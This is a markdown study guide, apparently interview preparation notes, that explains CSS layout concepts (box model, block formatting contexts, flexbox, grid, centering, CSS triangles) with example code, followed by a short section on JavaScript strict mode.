
# 1. HTML&CSS.md

## Box Model
The CSS Box Model is a core concept in web development that encompasses how elements are structured and spaced on a web page. It serves as the foundation for laying out elements within a document, affecting dimensions, spacing, and border properties.

### Components
The box model consists of several layers wrapped around each element:
- **Content**: The innermost part containing actual data like text, images, or videos.
- **Padding**: Space between the content and the border, affecting the element's inner whitespace without being visible itself.
- **Border**: A potentially visible boundary surrounding the padding (if any) and content. It can be styled in various ways.
- **Margin**: The outermost space around the element, separating it from adjacent elements.

### Box Model Properties
Understanding and manipulating the box model properties is crucial for effective CSS layout:

**Padding and Margin**
- **Syntax**: Both `padding` and `margin` properties can specify one to four values (clockwise from top: top, right, bottom, left):
  - **One value**: Applies the same spacing on all four sides.
  - **Two values**: Specifies top and bottom (first value), and left and right (second value).
  - **Three values**: Sets top (first value), left and right (second value), and bottom (third value).
  - **Four values**: Each value applies to a specific side, starting from the top and moving clockwise.
- **Individual Properties**: Use `padding-top`, `padding-right`, `padding-bottom`, `padding-left`, and similarly for margin, to affect specific sides.

  **Border**
  - **Overview**: The `border` property is shorthand for setting `border-width`, `border-style`, and `border-color` simultaneously.
  - **Examples**:
    - `border: 1px solid black;` sets a solid, black border with a width of 1px.
    - `border: 3px dashed red;` creates a 3px wide, dashed, red border.

### Box Sizing
Different box sizing models affect the calculation of an element’s total width and height:

**Content-Box (Standard Box Model)**
- **Default Model**: Width and height calculations include only the content.
- **Usage**: Utilized unless altered by setting the `box-sizing` property to another value.

**Border-Box (IE Box Model)**
- **Alternate Model**: Width and height calculations include content, padding, and border.
- **Advantage**: Simplifies layouts as the element's size adjustment does not require recalculating upon padding or border modifications.
- **Implementation**: `box-sizing: border-box;`

**Border-Box Example**

To facilitate understanding, consider a scenario where a box needs to fit exactly into a 100px by 100px space, including all model components:
```css
div {
  width: 100px;
  height: 100px;
  padding: 10px;
  border: 5px solid black;
  margin: 10px;
  box-sizing: border-box;
}
```
With `box-sizing: border-box;`, the padding and border are included within the 100px x 100px dimensions, avoiding any overflow or additional calculations.

## CSS Display Properties
### Block Boxes
- **Description**: Block boxes consume the full width available in their parent container, creating a new line before and after the box. This behavior is typical for structural elements used to group content sections.
- **Examples**: `div`, `section`, `p`, `header`, `footer`, `h1` to `h6`
- **Properties**: The `width` and `height` properties are applicable.
- **CSS Syntax**: `display: block;`

### Inline Boxes
- **Description**: Inline boxes do not break the line. They flow within the text and other inline elements, suitable for styling portions of text without disrupting the document flow.
- **Examples**: `span`, `a`, `em`, `strong`
- **Properties**: The `width` and `height` properties do not affect inline elements as their dimensions are content-driven.
- **CSS Syntax**: `display: inline;`

### Inline-Block Boxes
- **Description**: Inline-block boxes combine features of both block and inline boxes. They allow elements to sit next to each other on the same line while still maintaining block properties like width and height.
- **Examples**: Useful for creating menus or button groups where elements need to be aligned horizontally but also require specific dimensions.
- **CSS Syntax**: `display: inline-block;`

## Block Formatting Context (BFC)

A Block Formatting Context (BFC) is an essential concept in CSS layout that creates an independent rendering area on a webpage. It helps in managing the layout of block-level boxes and interacts with floating elements distinctly from the rest of the page. This isolation enables the elements within a BFC to behave in a predictable manner, shielding them from external layout influences and interferences such as float overlaps and margin collapses.

BFC is a independent layout block in which the following rules apply:
- **Block-level boxes**: Each element is treated as a block-level box, and the layout is vertically stacked.
- **Floats**: BFCs do not allow floats to overlap the BFC area.
- **Clearance**: BFCs do not collapse margins with their children.
- **Height Calculation**: The height of a BFC adjusts to its content, preventing overflow issues.
- **Adjacent Boxes**: Vertical margins between adjacent block-level boxes are respected.
- **Positioning**: BFCs contain absolutely positioned elements within their boundaries.
- **Overflow**: BFCs prevent elements from overlapping their boundaries.
- **Flexibility**: BFCs can be nested within other BFCs, allowing for complex layout structures.
- **Styling**: BFCs can be styled independently of other elements on the page.
- **Scrolling**: BFCs can contain elements with overflow, managing scrolling behavior.

In terms of clearing floats, since child elements within a BFC do not float outside the BFC, and the float child does involved in height calculation, the parent BFC will automatically expand to contain the floated child. This eliminates the need for additional clearing elements or clearfix techniques.

### Establishing a BFC

Creating a BFC is straightforward and can be accomplished by applying specific CSS properties to an HTML element. Here are the most commonly used methods:

- `display: table-cell;`
- `display: flex;`
- `display: inline-block;`
- `overflow: hidden;` (when value is not `visible`)
- `position: absolute;`
- `position: fixed;`

These properties, when applied, do not just alter the visual representation of elements but also define their interaction with the layout and surrounding elements in terms of floating and margin behaviors.

### Practical Applications of BFC

BFCs are not only theoretical but have practical applications in everyday web design and development. Below are key problems BFCs can solve with examples illustrating how to implement them.

#### Example 1: Solving Vertical Margin Collapse

Vertical margin collapse occurs when the vertical margins of adjacent elements combine into a single margin, dictated by the larger of the two, which can lead to unexpected layout results.

**HTML structure:**
```html
<section>box-one</section>
<section>box-two</section>
```

**CSS styling demonstrating the issue:**
```css
section {
  background: red;
  color: black;
  width: 200px;
  line-height: 100px;
  text-align: center;
  margin: 50px; /* Potential overlapping margin issue */
}
```

**Solution:**
To prevent this margin overlap, encase the second section in a div that creates a new BFC:
```html
<section>box-one</section>
<div class="box-container">
  <section>box-two</section>
</div>
```

**CSS modification to create a BFC:**
```css
.box-container {
  overflow: hidden; /* Triggers BFC creation */
}
```

#### Example 2: Managing Float-Related Layout Issues

Floating elements can lead to the parent container collapsing in height if the float is not properly cleared or contained within a BFC.

**HTML setup:**
```html
<div class="container">
  <div class="box"></div>
  <div class="box"></div>
</div>
```

**CSS issue demonstration:**
```css
.container {
  background: red;
}
.box {
  width: 100px;
  height: 100px;
  margin: 100px;
  background: blue;
  float: left; /* Causes height collapse */
}
```

**Solution:**
Adjust the `.container`'s display property to manage the floats properly and maintain the container's height:
```css
.container {
  background: red;
  display: inline-block; /* Establishes a BFC */
}
```

## CSS Selectors and Their Priorities
CSS selectors are patterns used to select the HTML elements you want to style. These selectors target specific elements based on their attributes, position within the HTML document, and their relationship to other elements.

### Types of CSS Selectors
- **Element Selectors**: Target elements based on their type, e.g., `p`, `div`, `h1`.
- **Class Selectors**: Target elements using their class attribute, prefixed with a dot, e.g., `.className`.
- **ID Selectors**: Target elements using their ID attribute, prefixed with a hash, e.g., `#idName`.
- **Attribute Selectors**: Select elements based on an attribute or attribute value, e.g., `[type="text"]`.
- **Pseudo-classes and Pseudo-elements**: 
  - Pseudo-classes like `:hover` and `:focus` target elements in specific states.
  - Pseudo-elements like `::before` and `::after` target specific parts of an element.
- **Combinators**: Include child (`>`), descendant (` `), adjacent sibling (`+`), and general sibling (`~`) selectors.

### Selector Specificity and Priorities
- **Specificity Rules**: Specificity determines which CSS rule applies if one element is targeted by multiple rules. The specificity hierarchy from highest to lowest priority is:
  - Inline styles, found within HTML tags.
  - ID selectors.
  - Class, pseudo-class, and attribute selectors.
  - Element selectors.
  - Universal selector (`*`), combinators, and negation pseudo-class (`:not()`), which do not contribute to specificity.
- **Important Note**: The `!important` declaration overrides other declarations but should be used sparingly to avoid complications in debugging.
- **Calculating Specificity**: Specificity is calculated as a numerical value, where:
  - ID selectors contribute the most to specificity.
  - Class, pseudo-classes, and attributes contribute less than IDs but more than elements.

**Examples**
- Example 1: `#header` will override `.main .header` due to higher specificity of the ID selector.
- Example 2: `h1.title` is more specific than `h1` because it combines an element and a class selector.

### Best Practices for Using CSS Selectors
- Maintain simplicity and reusability in selectors to facilitate easier management and maintenance of style sheets.
- Avoid overly specific selectors to ensure CSS remains flexible and manageable.
- Use meaningful class and ID names that reflect the function or content rather than appearance.

## Clear Floats

Floating elements can remove them from the normal flow of a document, causing parent containers to collapse if not properly handled. It's crucial for front-end developers to understand the methods available to manage this behavior effectively.

### Methods of Clearing Floats - Pure CSS
#### Pseudo-Element Method
This method involves using a CSS pseudo-element, which can clean up the HTML by eliminating the need for explicit clear elements.

**Pros**:
- Keeps the HTML cleaner by not requiring additional markup.
- Generally well-supported in modern browsers.

**Cons**:
- May not be supported by some older browsers.

**Example**:
```css
.parent::after {
    content: "";
    display: table;
    clear: both;
}
```

#### Block Formatting Context (BFC)
A Block Formatting Context is another CSS method to clear floats by setting properties on the parent element that establish a new block formatting context.

**Pros**:
- Simplifies CSS by not requiring additional elements.
- Broadly compatible with most browsers.

**Cons**:
- Can cause clipping of content that extends outside the parent's bounds.

**Example**:
```css
.parent {
    overflow: hidden; /* 'auto' can also be used if clipping is a concern */
}
```

#### Fixed Dimensions
Applying fixed dimensions to the parent element is a straightforward method, though less flexible.

**Pros**:
- Easy to implement and has universal browser support.

**Cons**:
- Inflexible and can lead to issues with content overflow if the size of child elements changes.

**Example**:
```css
.parent {
    width: 300px; /* Fixed width */
    height: 200px; /* Fixed height */
}
```

### Clearing Element - Adding HTML Element

Introducing a clearing element in HTML is a traditional method to ensure the parent container extends beyond the floated elements, maintaining the layout structure.

**Pros**:
- Effective and straightforward method to clear floats.
- Ensures the layout is not broken by floated elements.

**Cons**:
- Adds non-semantic, extra HTML elements which can complicate maintenance.

**Example**:
```html
<div class="parent">
    <div class="child">Content</div>
    <div class="child">Content</div>
    <div class="clearfix"></div>
</div>
```
```css
.clearfix {
    clear: both;
}
```

## CSS Units: Differences and Usage

1. **Pixels (px):** Pixels are a fixed-size unit that is most commonly used in screen media. A pixel is an absolute unit that doesn't change based on other elements. It's great for when you need precise control over element sizing, like for borders or shadows.

2. **Percent (%):** Percentages are relative units and depend on the parent element's size. They are extremely useful for creating layouts that adapt to different screen sizes, maintaining proportions regardless of the parent size.

3. **Ems (em):** Ems are relative to the font-size of the element they are used on. If used on font-size, they are relative to the font-size of the parent element. Ems are great for scalable typography and elements that need to maintain their proportions relative to text size.

4. **Rems (rem):** Rems are relative to the font-size of the root element (html). They allow for consistent scaling across the entire document and are very useful in responsive design for maintaining uniformity in spacing, layout, and typography.

5. **Viewport Width (vw):** 1vw is equal to 1% of the viewport's width. This unit is helpful for creating elements that scale with the width of the viewport, like for fluid layouts and typography.

6. **Viewport Height (vh):** Similarly, 1vh is 1% of the viewport's height. It's useful for elements that should scale with the height of the viewport, such as sections of a single-page layout.

7. **Viewport Minimum (vmin):** This unit is 1% of the viewport's smaller dimension (height or width). Vmin is particularly useful for maintaining aspect ratios in responsive design.

8. **Viewport Maximum (vmax):** Conversely, vmax is 1% of the larger dimension (height or width). It's less commonly used but can be beneficial for certain design challenges.

## Example of Responsive Design Code
```css
/* Base HTML font size */
html {
    font-size: 16px; /* Set a standard font size */
}

/* Responsive font size for smaller screens */
@media only screen and (max-width: 300px) {
    html {
        font-size: 14px; /* Reduce font size on small devices */
    }
}

/* Paragraph styling */
p {
    font-size: 1rem; /* Font size is relative to HTML element */
    line-height: 1.5; /* Good for readability */
    margin: 0 0 1rem 0; /* Spacing for paragraphs */
}

/* Responsive element styling */
@media only screen and (max-width: 768px) {
    p {
        font-size: 0.9rem; /* Smaller font size on tablets and smaller devices */
    }
}
```

## Differences Between offsetHeight, scrollHeight, and clientHeight

1. **offsetHeight**: The `offsetHeight` property measures the total visible height of an element, including padding, border, and the scroll bar on the element (if any), but excluding margins. It's the outermost height measurement that includes everything inside the margin.

2. **clientHeight**: The `clientHeight` property measures the visible content area (including padding) of an element but excludes the border, scrollbar, and margin. It's useful for getting the actual area available for the content inside an element.

3. **scrollHeight**: The `scrollHeight` property measures the total height of an element's content, including content not visible on the screen due to overflow. It includes padding but excludes borders, scrollbar, and margin. This is larger than the `clientHeight` if there's content that overflows outside the visible area.

## Retina Screen and 1px Lines Implementation
When designing for Retina displays, setting elements to 1px using CSS can result in lines that appear too thick, due to some mobile phones having a Device Pixel Ratio (DPR) of 2. This means 1 CSS pixel could use 2 physical pixels, making the line appear thicker than intended. Directly setting elements to 0.5px can lead to compatibility issues across different browsers. 

### Using CSS Pseudo-elements and Transform Property:  
To achieve the desired 1px line appearance on Retina screens, we can use CSS pseudo-elements combined with the `transform` property for optimization. 

```css
#box::before {
  content: '';
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  height: 1px;
  background: #d9d9d9;
  transform: scaleY(0.5);
  transform-origin: 0 0;
}
```

This approach leverages the `::before` pseudo-element to create a line that visually represents 1px on Retina displays by scaling it down by 50% along the Y-axis. This effectively simulates a thinner line without causing browser compatibility issues.

### Handling Borders with Border-Radius  
When dealing with elements that have a border-radius, applying a thin border can be slightly more complex due to the way borders interact with the border-radius. In such cases, using `box-shadow` can offer a solution that allows for a fine-tuned appearance:

```css
#box {
  box-shadow: 0 0 0 0.5px #d9d9d9;
}
```

This method applies a `box-shadow` that mimics a border, allowing for the adjustment of its thickness to achieve the desired 0.5px visual effect on Retina displays. It's a versatile approach that maintains the element's aesthetic, including when a border-radius is applied, ensuring the visual consistency of the design across high-resolution screens.

## Inheritance in CSS

CSS inheritance works by allowing certain properties of a parent element to influence the same properties in its child elements, unless these properties are explicitly overridden. This means that if a style is defined for a parent element, the child elements will automatically adopt this style, following the "cascading" nature of CSS.

### Properties That Inherit by Default

Not all CSS properties are inherited by default, but many related to text formatting are. Knowing which properties inherit by default can help you write cleaner and more efficient CSS. Here’s a list of commonly inherited properties:

- **Font Styles**: 
  - `font-family`: Defines the typeface.
  - `font-size`: Specifies the size of the font.
  - `font-style`: Determines whether the text is italicized.
  - `font-weight`: Controls the thickness of the font.
  - `line-height`: Sets the space between lines of text.

- **Text Formatting**:
  - `text-align`: Aligns text within an element (e.g., left, right, center).
  - `text-indent`: Indents the first line of a text block.
  - `text-transform`: Controls capitalization (e.g., uppercase, lowercase).
  - `text-decoration`: Applies decoration to text (e.g., underline, line-through).
  - `text-shadow`: Adds shadow to text.

- **Spacing**:
  - `letter-spacing`: Adjusts the space between characters.
  - `word-spacing`: Modifies the space between words.

- **Visibility**:
  - `visibility`: Specifies whether an element is visible or hidden.

## How to handle text Overflow with Ellipsis (`...`) in CSS? 
### For Single-line Text Overflow
```css
#box1 {
    border: 1px solid #ccc;
    width: 100px; /* Fixed width */
    white-space: nowrap; /* Prevents text from wrapping to a new line */
    overflow: hidden; /* Hides text that overflows the container's bounds */
    text-overflow: ellipsis; /* Adds an ellipsis to indicate text overflow */
}
```

In this setup, `white-space: nowrap` ensures the text stays on a single line, `overflow: hidden` hides any overflow, and `text-overflow: ellipsis` replaces the hidden overflow text with an ellipsis.

### For Multi-line Text Overflow
```css
#box2 {
    border: 1px solid #ccc;
    width: 100px; /* Fixed width */
    overflow: hidden; /* Hides text that overflows the container's bounds */
    display: -webkit-box; /* Displays the container as a webkit flex box */
    -webkit-box-orient: vertical; /* Sets the children's orientation to vertical */
    -webkit-line-clamp: 3; /* Limits the box to showing 3 lines of text, with overflow indicated by an ellipsis */
}
```

This method uses `-webkit-box`, `-webkit-box-orient`, and `-webkit-line-clamp` to achieve multi-line truncation. It's important to note that this approach is somewhat limited by its compatibility with only webkit-based browsers (e.g., Safari, Chrome). However, it's widely used due to its simplicity and effectiveness in most web scenarios.

## Flexbox Layout

Flexbox, formally known as the Flexible Box Layout, is a one-dimensional layout method for laying out items in rows or columns within a container. It allows you to design a complex layout structure with a simpler and more flexible approach.

- **Flex Container**: The element on which `display: flex` or `display: inline-flex` is applied. It becomes the flex container, and its children become flex items.
- **Flex Items**: Direct children of the flex container.

### Key Properties

**For the Flex Container**  

- **display**: This defines a flex container; set this to `flex` or `inline-flex`.
- **flex-direction**: This establishes the main-axis, determining the direction flex items are placed in the flex container. Values: `row`, `row-reverse`, `column`, `column-reverse`.
- **flex-wrap**: By default, flex items will all try to fit onto one line. You can change that and allow the items to wrap as needed with this property. Values: `nowrap`, `wrap`, `wrap-reverse`.
- **justify-content**: This defines the alignment along the main axis. Values include `flex-start`, `flex-end`, `center`, `space-between`, `space-around`, `space-evenly`.
- **align-items**: This defines the default behavior for how flex items are laid out along the cross axis on the current line. Think of it as the `justify-content` version for the cross-axis (perpendicular to the main-axis). Values: `flex-start`, `flex-end`, `center`, `baseline`, `stretch`.
- **align-content**: This aligns a flex container's lines within when there is extra space in the cross-axis, similar to how `justify-content` aligns individual items within the main-axis. Note, this property has no effect when there is only one line of flex items. Values: `flex-start`, `flex-end`, `center`, `space-between`, `space-around`, `stretch`.

**For Flex Items**  

- **flex-grow**: This defines the ability for a flex item to grow if necessary. It accepts a unitless value that serves as a proportion. It dictates what amount of the available space inside the flex container the item should take up.
- **flex-shrink**: This defines the ability for a flex item to shrink if necessary.
- **flex-basis**: This defines the default size of an element before the remaining space is distributed. It can be a length (e.g., 20%, 5rem, etc.) or a keyword like `auto`.
- **flex**: This is a shorthand for the `flex-grow`, `flex-shrink`, and `flex-basis` properties.
- **align-self**: This allows the default alignment (or the one specified by `align-items`) to be overridden for individual flex items.

### Flexbox Use Cases

- **Centering a child element**: Flexbox makes centering items within a container straightforward, both vertically and horizontally.
- **Creating a navigation bar**: Easily align navigation items evenly.
- **Equal height columns/rows**: Even when content size varies.

**Example**

```html
<div class="flex-container">
  <div class="flex-item">1</div>
  <div class="flex-item">2</div>
  <div class="flex-item">3</div>
</div>
```

```css
.flex-container {
  display: flex;
  justify-content: center; /* Center items horizontally */
  align-items: center; /* Center items vertically */
  height: 200px; /* Define height */
}

.flex-item {
  margin: 5px;
}
```

## Grid Layout

CSS Grid Layout is a two-dimensional layout system for the web. It lets you layout items into rows and columns, and it’s the perfect tool for creating complex web layouts. It’s a much more powerful and versatile system than Flexbox for certain types of layouts.

- **Grid Container**: The element on which `display: grid` or `display: inline-grid` is applied. It becomes the grid container.
- **Grid Item**: The children (direct descendants) of the grid container.
- **Grid Line**: The dividing lines that make up the structure of the grid. They can be horizontal or vertical.
- **Grid Cell**: The space between two adjacent row and two adjacent column grid lines. It’s a single "unit" of the grid.
- **Grid Area**: The total space surrounded by four grid lines. A grid area may be composed of any number of grid cells.

### Key Properties

**For the Grid Container**  

- **display**: Defines the element as a grid container and establishes a new grid formatting context for its contents. Values: `grid`, `inline-grid`.
- **grid-template-columns** / **grid-template-rows**: Defines the columns/rows of the grid with a space-separated list of values. The values represent the track size, and the space between them represents the grid line.
- **grid-gap** (also `row-gap` and `column-gap`): Defines the size of the gap between the rows and columns.
- **justify-items**, **align-items**, **place-items**: Aligns grid items along the row axis, column axis, or both.
- **justify-content**, **align-content**, **place-content**: Aligns the grid itself inside the grid container.

**For Grid Items**  

- **grid-column-start** / **grid-column-end** and **grid-row-start** / **grid-row-end**: Determines a grid item’s location within the grid by referring to specific grid lines.
- **grid-column** / **grid-row**: Shorthand for `grid-column-start`/`end` and `grid-row-start`/`end`.
- **grid-area**: Gives an item a name so it can be referenced by a template created with the `grid-template-areas` property.

### Grid Layout Use Cases

- **Complex layouts**: Ideal for designing layouts with multiple rows and columns, such as magazines and newspapers.
- **Responsive designs**: Easily adjust and reflow content based on screen size.
- **Alignment and spacing**: Precisely control the alignment, spacing, and sizing of grid items.

**Example**  

```html
<div class="grid-container">
  <div class="grid-item">1</div>
  <div class="grid-item">2</div>
  <div class="grid-item">3</div>
</div>
```

```css
.grid-container {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 10px;
}

.grid-item {
  padding: 20px;
  background-color: lightgrey;
}
```

## Responsive Three-Div Setup

The layout includes two fixed-width divs on the sides (`left` and `right`) and a dynamically adjusting center div (`center`).

### HTML Structure
The foundation of the layout starts with basic HTML:

```html
<div class="parent">
    <div class="left">Left</div>
    <div class="center">Center</div>
    <div class="right">Right</div>
</div>
```

### CSS Resets
Consistent styling across browsers begins with CSS resets:

```css
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

div {
    height: 100px;  /* Example height for visualization */
}

.parent {
  width: 100%;
}

.left, .right {
    width: 100px;  /* Fixed width for left and right divs */
}

.left {
    background-color: lightblue;
}

.center {
    background-color: lightgreen;
}
```

### Styling Solutions
Explore different CSS solutions to achieve the layout, each with their unique benefits and limitations.

### Float-Based Layout
Utilize CSS floats for a traditional approach:

```css
.left {
    float: left;
}

.right {
    float: right;
}

.center {
    width: calc(100% - 200px); /* Adjust width dynamically */
    margin: 0 100px; /* Prevents overlap with floated divs */
}
```
Or
```css
.parent {
    overflow: hidden; /* Clears the float effect within the container, creates a BFC */
}

.left {
    float: left;
}

.right {
    float: right;
}

.center {
    float: left;
    width: calc(100% - 100px); /* Adjust width dynamically */
}
```
**Pros**: Broad compatibility with older browsers.  
**Cons**: Potential layout quirks requiring `clear` fixes.  
**Notes**: If we let the `.center` div float as well, we can avoid the need for the `calc` function and margin adjustments. However, this may introduce additional complexities in managing the parent container's height, see clearfix or overflow solutions above.

### Table Display Layout
Simulate table behavior with CSS:

```css
.parent {
    display: table;
}

.left, .center, .right {
    display: table-cell;
}
```
**Pros**: Stable and predictable rendering.  
**Cons**: Semantically inappropriate for non-tabular data.
**Notes**: In table layout, if no fixed width is set for a table cell, they will share the available space equally.

### Absolute Positioning Layout
Control positioning explicitly:

```css
.parent {
    position: relative;
}

.left {
    position: absolute;
    left: 0;
}

.right {
    position: absolute;
    right: 0;
}

.center {
    margin: 0 100px;
    width: calc(100% - 200px);
}
```

Or
```css
.parent {
    position: relative;
    /* Prevent height collapse, clear floats, create BFC */
    overflow: hidden;
}

.left {
    position: absolute;
    left: 0;
}

.right {
    position: absolute;
    right: 0;
}

.center {
    position: absolute;
    left: 100px;
    right: 100px;
}
```
**Pros**: Complete control over positioning.  
**Cons**: Complicates responsiveness and document flow.  

### Flexbox Layout
Implement a modern responsive solution:

```css
.parent {
    display: flex;
}

.center {
    flex-grow: 1;
}
```
**Pros**: Efficient, responsive design with minimal code.  
**Cons**: Issues with very old browser compatibility.

### Grid Layout
Create precise layouts with CSS Grid:

```css
.parent {
    display: grid;
    grid-template-columns: 100px 1fr 100px;
}
```
**Pros**: Ideal for complex layouts, clean and versatile.  
**Cons**: Not fully supported in older browsers.

## Different Ways to Implement a Two-Column Layout with Fixed and Responsive Sides

Creating a layout where one side has a fixed width while the other side adapts responsively.

```html
<div class="container">
    <div class="left-side">Fixed width</div>
    <div class="right-side">Responsive width</div>
</div>
```

```css
.container {
    width: 100%;
    height: 200px; /* Example height for visualization */
}

.left-side {
    width: 200px; /* Fixed width */
    background-color: lightblue;
}

.right-side {
    background-color: lightgreen;
}
/* Add responsive styling here */
```

### Strict responsive solutions

**Flexbox Layout**
Flexbox offers a robust method for creating dynamic layouts. It excels in aligning and distributing space within a container, making it ideal for uncertain item sizes.

```css
.container {
    display: flex;
}

.right-side {
    flex-grow: 1;
}
```
**Explanation**: The `.container` uses `display: flex;` to become a flex container. The `.left-side` has a fixed width of 200px, ensuring stability, while the `.right-side` uses `flex-grow: 1;` to adapt and fill the remaining space, maintaining responsiveness as the viewport size changes.

**Grid Layout**
The CSS Grid Layout provides precise control over layout grids, suitable for complex arrangements.

```css
.container {
    display: grid;
    grid-template-columns: 200px 1fr;
}
```
**Explanation**: Here, `grid-template-columns: 200px 1fr;` sets up a two-column grid. The `.left-side` is fixed at 200px, and the `.right-side` expands dynamically with `1fr` representing a fraction of the available space, offering a fluid response to viewport adjustments.

**Table Layout**
Table Layout, while traditional, is effectively used for displaying structured data and certain layout designs.

```css
.container {
    display: table;
    width: 100%;
}

.left-side, .right-side {
    display: table-cell;
}
```
**Explanation**: The `.container` is set as a table, creating a robust framework for the `.left-side` and `.right-side` styled as table cells. The `.left-side` maintains a fixed width, and the `.right-side` adjusts to occupy any remaining space, ensuring the layout remains responsive.

### Non-strict responsive solutions
Some layout techniques do not adapt when the viewport size changes but can be useful for specific design requirements.

**CSS Float Layout**  
The float layout method, though somewhat dated, remains useful particularly for simpler or legacy projects.

```css
.left-side {
    float: left;
}

.right-side {
    margin-left: 200px; /* Prevents overlap with the left side */
    width: calc(100% - 200px); /* Dynamic calculation of the width */
}
```
Or
```css
.container {
    overflow: hidden; /* Clears the float effect within the container */
}

.left-side {
    float: left;
    width: 200px; /* Fixed width */
}

.right-side {
    float: left;
    width: calc(100% - 200px); /* Dynamic calculation of the width */
```
**Explanation**: By floating the `.left-side` to the left, we allow the `.right-side` to automatically adjust its width with `calc(100% - 200px);`. This dynamic calculation subtracts the fixed width of the left column from the total container width, ensuring the right side is responsive to the remaining space.

**CSS Positioning Layout**  
Positioning allows for precise control over layout elements, ideal for complex positioning needs.

```css
.container {
    position: relative;
}

.left-side {
    position: absolute;
    left: 0;
}

.right-side {
    margin-left: 200px; /* Prevents overlap with the left side */
    width: calc(100% - 200px); /* Dynamic calculation of the width */
}
```
Or
```css
.container {
    position: relative;
    overflow: hidden; /* Clears the float effect within the container, creates a BFC */
}

.left-side {
    position: absolute;
    left: 0;
    width: 200px; /* Fixed width */
}

.right-side {
    position: absolute;
    left: 200px; /* Adjusts position based on the left side */
    right: 0;
}
```
**Explanation**: By setting the `.left-side` to `position: absolute;` relative to its `position: relative;` parent, it remains stationary. The `.right-side` employs a `margin-left` of 200px to start adjacent to the left side, providing a responsive layout that adjusts based on the overall container width.

**CSS Inline-block Layout**  
The inline-block method is useful for simpler two-column layouts but requires careful management of element spacing.

```css
.container {
    font-size: 0; /* Eliminates whitespace between inline-block elements */
}

.left-side, .right-side {
    display: inline-block;
    vertical-align: top; /* Ensures top alignment */
}

.right-side {
    width: calc(100% - 200px); /* Adjusts width based on the left side */
}
```
**Explanation**: Both `.left-side` and `.right-side` are displayed as inline-block, with the `.left-side` fixed at 200px. The `.right-side` uses `calc(100% - 200px);` for width adjustment, filling the rest of the container width. Setting the container’s `font-size` to 0 removes the whitespace between inline-block elements, ensuring the columns are seamlessly adjacent without gaps.

## CSS Centering Techniques
```html
<!-- Example HTML structure to use as a reference throughout this guide -->
<div class="container">
    <div class="center-fixed"></div>
    <div class="center-auto"></div>
    <div class="center-dynamic"></div>
    <div class="center-flex"></div>
    <div class="center-grid"></div>
    <div class="center-table"></div>
</div>

<style>
    .container {
        width: 300px;
        height: 300px;
        border: 1px solid black;
    }
</style>
```

### Centering with Dynamic Dimensions
**Absolute** Positioning with Transform
```css
.container {
    position: relative;
}

.center-dynamic {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}
```

**Flexbox**
```css
.center-flex {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh; /* Full viewport height */
}
```

**CSS Grid**
```css
.center-grid {
    display: grid;
    place-items: center;
    height: 100vh; /* Full viewport height */
}
```

**table**
```css
.container {
    display: table;
}

.center-table {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
```

### Centering with Fixed Dimensions
**Absolute Positioning with Negative Margin**
```css
.container {
    position: relative;
}

.center-fixed {
    position: absolute;
    width: 200px;
    height: 100px;
    top: 50%;
    left: 50%;
    margin-top: -50px;  /* Half of height */
    margin-left: -100px; /* Half of width */
}
```

**Absolute Positioning with Auto Margins**
```css
.container {
    position: relative;
}

.center-auto {
    position: absolute;
    width: 200px;
    height: 100px;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    margin: auto;
}
```
Explanation: setting `top`, `right`, `bottom`, and `left` is actually moving the boundary of the box model, not only the content. Setting them all to 0 will make the box model fill the container, and since we set the content with fixed dimensions, `margin: auto` will center the box model within the container. 

## CSS Graphics: Drawing a Triangle

Triangles are an essential graphical element in web design, often utilized to indicate dropdowns in expandable menus or to highlight selected options in navigation bars. By using CSS instead of images to create these shapes, developers can significantly enhance website performance.

**Benefits of Using CSS for Triangles**

CSS-based triangles improve loading times and reduce data bandwidth by eliminating the need for additional HTTP requests that image files would require. This method is not only efficient but also scalable and easily customizable, facilitating a faster and more responsive user experience.

```html
<!-- HTML structure -->
<div class="triangle"></div>

<!-- CSS styling -->
<style>
.triangle {
  width: 0; 
  height: 0;
  border: 10px solid transparent;
  border-left: 10px solid red; /* Visible border - color can be changed */
}
</style>
```

**Technical Explanation and Customization**  
- **Structure**: The `div` element assigned with the `.triangle` class does not require explicit height or width dimensions as the shape is wholly formed through CSS borders.
- **Borders**:
  - **Transparent Borders**: The illusion of the triangle is created by making three sides of a square's borders transparent, thereby visually forming two sides of the triangle.
  - **Colored Border**: The fourth side (`border-left` in this example) is colored, forming the visible base of the triangle.
- **Customization**: Altering the direction of the triangle involves changing the border that is colored. For instance, to make the triangle point upwards, apply `border-bottom: 10px solid red;` while keeping the other borders transparent.

# 2.0 Javascript.md

## JavaScript's Strict Mode Features

JavaScript's Strict Mode is a feature that enforces a stricter parsing and error handling mechanism on your JavaScript code. Activating Strict Mode can be done by adding `'use strict';` at the beginning of a script or a function block. This mode intentionally has different semantics from the normal code, aimed at improving code reliability and performance.

### Features of Strict Mode

1. **Mandatory Variable Declarations**: In Strict Mode, every variable must be declared before use. If a script attempts to use an undeclared variable, JavaScript will throw a `ReferenceError`. This requirement helps to avoid the accidental creation of global variables caused by typographical errors.

2. **Disallows the `with` Statement**: The `with` statement is not allowed in Strict Mode because it creates ambiguity about the scope of variables. Its use can lead to significant performance hits and complicates the debugging process, as it modifies the scope chain, making it harder to predict which variables will be affected by a piece of code.

3. **Scoped `eval()` Function**: Any declarations within an `eval()` expression in Strict Mode do not affect the surrounding scope, making `eval()` safer by preventing it from introducing new variables or modifying existing ones in the parent scope.

4. **Secure `this` Keyword Behavior**: In functions that are not called as methods of an object, the value of `this` is `undefined` in Strict Mode. This contrasts with non-strict mode, where `this` defaults to the global object, reducing the risk of inadvertently modifying the global environment.

5. **Prohibits Duplicate Parameter Names**: Functions cannot have multiple parameters with the same name, which eliminates potential errors from duplicated identifiers and enhances code clarity.

6. **Immutable Non-Writable Properties**: In Strict Mode, attempts to assign values to non-writable properties result in a `TypeError`. This feature ensures the immutability of constants and read-only properties, thus preserving data integrity.

7. **Restrictions on Deleting Properties**: Trying to delete non-deletable properties (such as built-in objects or fixed properties) will throw a `TypeError`, protecting important parts of the language’s core.

8. **No Octal Numeric Literals**: Octal literals and octal escape sequences are not allowed in Strict Mode. This restriction avoids confusion between mistakenly leading zeroes in numbers and octal syntax, making the code more readable and less prone to errors. 
